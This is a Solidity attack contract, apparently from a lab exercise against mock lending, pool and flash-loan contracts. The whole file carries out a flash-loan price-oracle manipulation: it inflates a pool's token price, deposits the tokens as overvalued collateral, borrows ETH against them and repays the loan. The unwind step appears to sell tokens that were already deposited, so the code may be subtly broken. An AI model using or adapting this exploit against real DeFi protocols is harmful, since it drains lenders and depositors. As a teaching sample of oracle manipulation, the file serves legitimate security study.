// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {OracleLender} from "../src/OracleLender.sol";
import {SimplePool} from "../src/SimplePool.sol";
import {FlashLoanProvider} from "../src/FlashLoanProvider.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {IFlashBorrower} from "../src/IFlashBorrower.sol";

contract OracleAttack {
    OracleLender public lender;
    SimplePool public pool;
    FlashLoanProvider public flp;
    MockERC20 public token;

    constructor(address _lender, address _pool, address _flp, address _token) {
        lender = OracleLender(_lender);
        pool = SimplePool(_pool);
        flp = FlashLoanProvider(_flp);
        token = MockERC20(_token);
    }

    function attack() external {
        token.approve(address(pool), type(uint256).max);
        token.approve(address(lender), type(uint256).max);
        flp.flashLoan(200 ether);
    }

    function execute() external payable {
        // 1. Manipulate: swap 200 ETH → tokens (inflates pool price)
        pool.swapEthToToken{value: 200 ether}();
        
        // 2. Deposit received tokens as collateral
        uint256 tokens = token.balanceOf(address(this));
        lender.deposit(tokens);
        
        // 3. Borrow against inflated collateral value
        lender.borrow(120 ether);
        
        // 4. Unwind: sell tokens back to pool
        pool.swapTokenToEth(tokens);
        
        // 5. Repay flash loan (provider checks balance after execute returns)
        uint256 fee = (200 ether * 9) / 10_000; // 0.09%
        uint256 repay = 200 ether + fee;
        (bool ok, ) = address(flp).call{value: repay}("");
        require(ok, "repay failed");
    }

    receive() external payable {}
}